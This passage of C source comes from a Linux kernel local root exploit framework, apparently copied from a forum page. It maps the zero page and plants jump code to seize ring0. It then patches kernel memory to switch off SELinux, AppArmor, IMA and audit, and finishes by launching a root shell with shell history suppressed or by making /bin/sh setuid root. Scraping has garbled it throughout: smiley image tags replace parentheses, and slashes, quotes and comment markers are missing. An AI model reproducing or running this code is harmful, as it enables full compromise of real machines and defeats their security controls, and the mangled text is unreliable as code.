      for (p = (unsigned char )sel_read_enforce; (unsigned long)p  (sel_read_enforce + 0x20); p++) {
        if (p[0] == 0xff && p[1] == 0x35 && (unsigned int )&p[2]  0xc0000000) {
           while we're at it, disable
           SELinux without having a
           symbol for selinux_enforcing img src=smiley11.gif width=18 height=18 border=0
          if (!selinux_enforcing) {
            sel_enforce_ptr = (int )&p[2];
            if (sel_enforce_ptr) {
              sel_enforce_ptr = 0;
              what_we_do = 2;
            }
          }
          if (can_write && what_we_do == 2) {
            make_range_readwrite((unsigned long)p, 6);
            p[0] = 'x68';
            p[5] = 'x90';
            (unsigned int )&p[1] = 1;
            make_range_readonly((unsigned long)p, 6);
          }
        } else if (p[0] == 0xa1 &&
          (unsigned int )&p[1]  0xc0000000) {
           old 2.6 are compiled different 
          if (!selinux_enforcing) {
            sel_enforce_ptr = (int )&p[1];
            if (sel_enforce_ptr) {
              sel_enforce_ptr = 0;
              what_we_do = 2;
            }
          }
          if (can_write && what_we_do == 2) {
            make_range_readwrite((unsigned long)p, 5);
            p[0] = 'xb8';
            (unsigned int )&p[1] = 1;
            make_range_readonly((unsigned long)p, 5);
          }
        }
      }
    }

    turn_on_wp();
  }

   push it real good
  give_it_to_me_any_way_you_can();

  return -1;
}

 we do this so that we can swap the stack out later if we need to upon returning to userland
   and we won't lose any local variables, so the perf_counter exploit can have the same
   pretty printouts as all the others img src=smiley11.gif width=18 height=18 border=0
   note that -fomit-frame-pointer is required to pull this hack off


static unsigned char mem = NULL;
static _prepare_for_exploit prepare;
static _get_exploit_state_ptr get_exploit_state_ptr;
static _post_exploit post;
static int requires_null_page;
static int exp_idx;

 more sgrakkyutwiz love 
static void exec_rootshell(void)
{
  char buf[PATH_MAX+1];
  struct stat st;
  int ret;

  char argv[] = { binsh, -i, NULL };
  char argvbash[] = { binsh, --norc, --noprofile, NULL };
  char envp[] = { TERM=linux, BASH_HISTORY=devnull, HISTORY=devnull,
      history=devnull,
      PATH=binsbinusrbinusrsbinusrlocalbinusrlocalsbin,
      NULL };
  char envpbash[] = { TERM=linux, PS1=u@hw$,
      BASH_HISTORY=devnull, HISTORY=devnull,
      history=devnull,
      PATH=binsbinusrbinusrsbinusrlocalbinusrlocalsbin,
      NULL };
  memset(buf, 0, sizeof(buf));

  ret = stat(binbash, &st);

  readlink(binsh, buf, PATH_MAX);

  setgroups(0, NULL);  uses CAP_SETGID, we don't care if it succeeds
           though it should always

   if binsh points to dash and binbash exists, use binbash 
  if ((!strcmp(buf, bindashimg src=smiley11.gif width=18 height=18 border=0  !strcmp(buf, dashimg src=smiley11.gif width=18 height=18 border=0) && !ret)
    execve(binbash, argvbash, envpbash);
  else
    execve(binsh, argv, envp);

  fprintf(stdout,  [+] Failed to exec rootshellnimg src=smiley11.gif width=18 height=18 border=0;
}

int pa__init(void m)
{
  sync();

  get_segment_descriptors();

  exit_stack = (char )calloc(1, 1024  1024);
  if (exit_stack == NULL) {
    fprintf(stdout, Unable to alloc exit_stacknimg src=smiley11.gif width=18 height=18 border=0;
    exit(1);
  }
  exp_state.exit_stack = exit_stack;

#ifndef NON_NULL_ONLY
  if ((personality(0xffffffff)) != PER_SVR4) {
    mem = mmap(NULL, 0x1000, PROT_READ  PROT_WRITE  PROT_EXEC, MAP_FIXED  MAP_ANONYMOUS  MAP_PRIVATE, 0, 0);
    if (mem != NULL) {
      mem = mmap(NULL, 0x1000, PROT_READ  PROT_WRITE, MAP_FIXED  MAP_ANONYMOUS  MAP_PRIVATE, 0, 0);
      if (mem != NULL) {
        fprintf(stdout, UNABLE TO MAP ZERO PAGE!nimg src=smiley11.gif width=18 height=18 border=0;
        goto boo_hiss;
      }
    }
  } else {
    main_ret = mprotect(NULL, 0x1000, PROT_READ  PROT_WRITE  PROT_EXEC);
    if (main_ret == -1) {
      fprintf(stdout, UNABLE TO MPROTECT ZERO PAGE!nimg src=smiley11.gif width=18 height=18 border=0;
      goto boo_hiss;
    }
  }
  goto great_success;
boo_hiss
#ifdef HAVE_SELINUX
  if (exp_state.run_from_main == 1 && is_selinux_enabled()) {
    security_context_t scontext;
    context_t newcontext;
    int retval;

    retval = getcon(&scontext);
    if (retval  0)
      goto oh_fail;

    if (strstr(scontext, wine_timg src=smiley11.gif width=18 height=18 border=0) {
      fprintf(stdout, allow_unconfined_mmap_low must actually work on this machine!nimg src=smiley11.gif width=18 height=18 border=0;
       don't repeat 
      exit(1);
    }

    fprintf(stdout, But wait!  Perhaps SELinux can revive this dead exploit...nimg src=smiley11.gif width=18 height=18 border=0;
    newcontext = context_new(scontext);
    freecon(scontext);
    retval = context_type_set(newcontext, wine_timg src=smiley11.gif width=18 height=18 border=0;
    if (retval)
      goto oh_fail;
    scontext = context_str(newcontext);
    if (scontext == NULL)
      goto oh_fail;
    if (security_check_context(scontext)  0)
      goto oh_fail;
    retval = setexeccon(scontext);
    if (retval  0)
      goto oh_fail;
    context_free(newcontext);
    fprintf(stdout, This looks promising!nimg src=smiley11.gif width=18 height=18 border=0;
    execl(procselfexe, NULL);
  }
oh_fail
  fprintf(stdout, Nope ;(nimg src=smiley11.gif width=18 height=18 border=0;
#endif
  exit(1);
great_success
  fprintf(stdout,  [+] MAPPED ZERO PAGE!nimg src=smiley11.gif width=18 height=18 border=0;
#endif

  add_exploit_modules();

  if (num_exploits == 0) {
    fprintf(stdout, No exploit modules detected, exiting.nimg src=smiley11.gif width=18 height=18 border=0;
    exit(1);
  }

repeat_it
  fprintf(stdout, Choose your exploitnimg src=smiley11.gif width=18 height=18 border=0;
  for (exp_idx = 0; exp_idx  num_exploits; exp_idx++)
    fprintf(stdout,  [%d] %sn, exp_idx, modules[exp_idx].desc);
  fprintf(stdout,  [%d] Exitn, exp_idx);
  fprintf(stdout,  img src=smiley11.gif width=18 height=18 border=0;
  fflush(stdout);
  scanf(%d, &main_ret);
  if (main_ret == exp_idx)
    exit(0);
  if (main_ret  0  main_ret = num_exploits) {
    fprintf(stdout, Invalid number.nimg src=smiley11.gif width=18 height=18 border=0;
    goto repeat_it;
  }

  RANDOM_THOUGHT();

  prepare = modules[main_ret].prep;
  trigger = modules[main_ret].trigger;
  get_exploit_state_ptr = modules[main_ret].get_exploit_state_ptr;
  post = modules[main_ret].post;
  requires_null_page = modules[main_ret].requires_null_page;

  exp_state.get_kernel_sym = (_get_kernel_sym)&get_kernel_sym;
  exp_state.own_the_kernel = (void )&own_the_kernel;
  exp_state.exit_kernel = (void )&exit_kernel;
  get_exploit_state_ptr(&exp_state);

  our_uid = getuid();

  ima_audit = (int )get_kernel_sym(ima_auditimg src=smiley11.gif width=18 height=18 border=0;
  ima_file_mmap = (unsigned char )get_kernel_sym(ima_file_mmapimg src=smiley11.gif width=18 height=18 border=0;
  ima_bprm_check = (unsigned char )get_kernel_sym(ima_bprm_checkimg src=smiley11.gif width=18 height=18 border=0;
  ima_path_check = (unsigned char )get_kernel_sym(ima_path_checkimg src=smiley11.gif width=18 height=18 border=0;
  ima_file_check = (unsigned char )get_kernel_sym(ima_file_checkimg src=smiley11.gif width=18 height=18 border=0;
  selinux_enforcing = (int )get_kernel_sym(selinux_enforcingimg src=smiley11.gif width=18 height=18 border=0;
  selinux_enabled = (int )get_kernel_sym(selinux_enabledimg src=smiley11.gif width=18 height=18 border=0;
  apparmor_enabled = (int )get_kernel_sym(apparmor_enabledimg src=smiley11.gif width=18 height=18 border=0;
  apparmor_complain = (int )get_kernel_sym(apparmor_complainimg src=smiley11.gif width=18 height=18 border=0;
  apparmor_audit = (int )get_kernel_sym(apparmor_auditimg src=smiley11.gif width=18 height=18 border=0;
  apparmor_logsyscall = (int )get_kernel_sym(apparmor_logsyscallimg src=smiley11.gif width=18 height=18 border=0;
  security_ops = (unsigned long )get_kernel_sym(security_opsimg src=smiley11.gif width=18 height=18 border=0;
  default_security_ops = get_kernel_sym(default_security_opsimg src=smiley11.gif width=18 height=18 border=0;
  sel_read_enforce = get_kernel_sym(sel_read_enforceimg src=smiley11.gif width=18 height=18 border=0;
  audit_enabled = (int )get_kernel_sym(audit_enabledimg src=smiley11.gif width=18 height=18 border=0;
  commit_creds = (_commit_creds)get_kernel_sym(commit_credsimg src=smiley11.gif width=18 height=18 border=0;
  prepare_kernel_cred = (_prepare_kernel_cred)get_kernel_sym(prepare_kernel_credimg src=smiley11.gif width=18 height=18 border=0;
  xen_start_info = (unsigned long )get_kernel_sym(xen_start_infoimg src=smiley11.gif width=18 height=18 border=0;
  mark_rodata_ro = get_kernel_sym(mark_rodata_roimg src=smiley11.gif width=18 height=18 border=0;
  set_kernel_text_ro = get_kernel_sym(set_kernel_text_roimg src=smiley11.gif width=18 height=18 border=0;
  make_lowmem_page_readonly = (_make_lowmem_page_readonly)get_kernel_sym(make_lowmem_page_readonlyimg src=smiley11.gif width=18 height=18 border=0;
  make_lowmem_page_readwrite = (_make_lowmem_page_readwrite)get_kernel_sym(make_lowmem_page_readwriteimg src=smiley11.gif width=18 height=18 border=0;

  main_ret = prepare(mem);
  if (main_ret == STRAIGHT_UP_EXECUTION_AT_NULL) {
    mem[0] = 'xff';
    mem[1] = 'x25';
    (unsigned int )&mem[2] = (sizeof(unsigned long) != sizeof(unsigned int))  0  6;
    (unsigned long )&mem[6] = (unsigned long)&own_the_kernel;
  } else if (main_ret == EXIT_KERNEL_TO_NULL) {
    mem[0] = 'xff';
    mem[1] = 'x15';
    (unsigned int )&mem[2] = (sizeof(unsigned long) != sizeof(unsigned int))  6  12;
    mem[6] = 'xff';
    mem[7] = 'x25';
    (unsigned int )&mem[8] = (sizeof(unsigned long) != sizeof(unsigned int))  sizeof(unsigned long)  16;
    (unsigned long )&mem[12] = (unsigned long)&own_the_kernel;
    (unsigned long )&mem[12 + sizeof(unsigned long)] = (unsigned long)&exit_kernel;
  } else if ((main_ret & EXECUTE_AT_NONZERO_OFFSET) == EXECUTE_AT_NONZERO_OFFSET) {
    int off = main_ret & 0xfff;
    mem[off] = 'xff';
    mem[off + 1] = 'x25';
    (unsigned int )&mem[off + 2] = (sizeof(unsigned long) != sizeof(unsigned int))  0  off + 6;
    (unsigned long )&mem[off + 6] = (unsigned long)&own_the_kernel;
  }

   trigger it, and handle the exit_kernel case 
  trigger_get_return();

  if (exp_state.got_ring0) {
    fprintf(stdout,  [+] Got ring0!nimg src=smiley11.gif width=18 height=18 border=0;
  } else {
    fprintf(stdout, didn't get ring0, bailingnimg src=smiley11.gif width=18 height=18 border=0;
    exit(0);
  }

  if (commit_creds && prepare_kernel_cred)
    fprintf(stdout,  [+] Detected cred supportnimg src=smiley11.gif width=18 height=18 border=0;
  else
    fprintf(stdout,  [+] Detected %s %dk stacks, with current at %p%sn,
      twofourstyle  2.4 style  2.6 style,
      eightk_stack  8  4, (char )current_addr,
      cred_support   and cred support  img src=smiley11.gif width=18 height=18 border=0;
  if (raised_caps)
    fprintf(stdout,  [+] Raised to full old-style capabilitiesnimg src=smiley11.gif width=18 height=18 border=0;
  if (cred_offset)
    fprintf(stdout,  [+] cred ptrs offset found at 0x%04x in task structn, cred_offset);
  if (init_cred_addr)
    fprintf(stdout,  [+] init_cred found at %pn, (char )init_cred_addr);

  {
    char msg;
    switch (what_we_do) {
      case 1
        msg = AppArmor;
        break;
      case 2
        msg = SELinux;
        break;
      case 3
        msg = LSM;
        break;
      case 4
        msg = IMA;
        break;
      default
        msg = nothing, what an insecure machine!;
    }
    fprintf(stdout,  [+] Disabled security of  %sn, msg);
  }
  if (xen_detected && mark_rodata_ro && set_kernel_text_ro && (make_lowmem_page_readonly == NULL  make_lowmem_page_readwrite == NULL))
    fprintf(stdout,  [+] Unable to issue Xen hypercall for .text modification -- modification disablednimg src=smiley11.gif width=18 height=18 border=0;

  if (exp_state.got_root == 1)
    fprintf(stdout,  [+] Got root!nimg src=smiley11.gif width=18 height=18 border=0;
  else {
    fprintf(stdout,  [+]karaeL derki; rootlayamad.n img src=smiley9.gif width=18 height=18 border=0nimg src=smiley11.gif width=18 height=18 border=0;
    exit(0);
  }

  main_ret = post();
  if (main_ret == RUN_ROOTSHELL)
    exec_rootshell();
  else if (main_ret == CHMOD_SHELL) {
    chmod(binsh, 04755);
    fprintf(stdout, binsh is now setuid root.nimg src=smiley11.gif width=18 height=18 border=0;
  } else if (main_ret == FUNNY_PIC_AND_ROOTSHELL) {
    system(gthumb --fullscreen .funny.jpgimg src=smiley11.gif width=18 height=18 border=0;
